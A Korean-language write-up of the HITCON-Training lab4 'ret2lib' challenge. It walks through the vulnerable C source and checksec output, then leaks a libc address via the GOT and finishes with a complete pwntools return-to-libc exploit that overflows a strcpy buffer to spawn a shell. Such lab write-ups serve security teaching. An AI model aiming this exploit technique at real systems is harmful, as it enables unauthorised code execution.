lab4
====
먼저 문제에서 제공하는 c 파일을 열어보자.
```
#include <stdio.h>

void See_something(unsigned int addr){
	int *address ;
	address = (int *)addr ;
	printf("The content of the address : %p\n",*address);
};

void Print_message(char *mesg){
	char buf[48];
	strcpy(buf,mesg);
	printf("Your message is : %s",buf);
}

int main(){
	char address[10] ;
	char message[256];
	unsigned int addr ;
	puts("###############################");
	puts("Do you know return to library ?");
	puts("###############################");
	puts("What do you want to see in memory?");
	printf("Give me an address (in dec) :");
	fflush(stdout);
	read(0,address,10);
	addr = strtol(address);
	See_something(addr) ;
	printf("Leave some message for me :");
	fflush(stdout);
	read(0,message,256);
	Print_message(message);
	puts("Thanks you ~");
	return 0 ;
}
```
이번 프로그램은 특정한 주소를 입력하면 그 주소안에 들어있는 값을 출력해주고   
메세지를 입력받아 그것을 출력해주는 프로그램으로 보인다.

```
root@kali:~/HITCON-Training/LAB/lab4# checksec ./ret2lib
[*] '/root/HITCON-Training/LAB/lab4/ret2lib'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
확인한 결과 ASLR과 NX bit가 걸려있다.

read 함수가 호출된 이후 read의 got에는 실제 함수 주소를 가리키게 되므로 pwntool을 이용하여 got주소를 구하고   
이 주소를 프로그램에 넣어주면 `The content of the address :` 이와 같은 문구와 함께 실제 주소를 알려줄 것이다.  

ASLR이 걸려 있으므로 gdb를 통하여 system 함수의 offset과 "/bin/sh"문자열의 offset을 구하고 위의 주소와 계산을 해주면 실제 함수 주소를 구할 수 있다.
```
gdb-peda$ x/wx read
0xf7eb4ea0 <read>:	0xec835356
gdb-peda$ x/wx system
0xf7e0b9e0 <system>:	0x0f9148e8
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4baaa ("/bin/sh")
```

system함수의 offset은 `a94c0`이고 bin/sh의 offset은 `96c0a`이다.


이제 payload를 만들어주면 끝이다.  
60개의 dummy를 넣고, system함수의 주소와 가상의 리턴 주소값(dummy) 그리고 system함수의 인자를 넣어주면 된다.

```
from pwn import*

p = process('./ret2lib')
e = ELF('./ret2lib')

read_got = e.got["read"]

p.recvuntil(":")
p.send(str(read_got))

read_addr = p.recvline()
read_addr = int(read_addr.split(":")[1].strip(), 16)

sys_off = 0xa94c0
binsh_off = 0x96c0a

sys_addr = read_addr - sys_off
binsh_addr = read_addr + binsh_off

pl = ''
pl += 'a'*60
pl += p32(sys_addr)
pl += 'a'*4
pl += p32(binsh_addr)

p.recvuntil(':')
p.send(pl)
p.interactive()
```

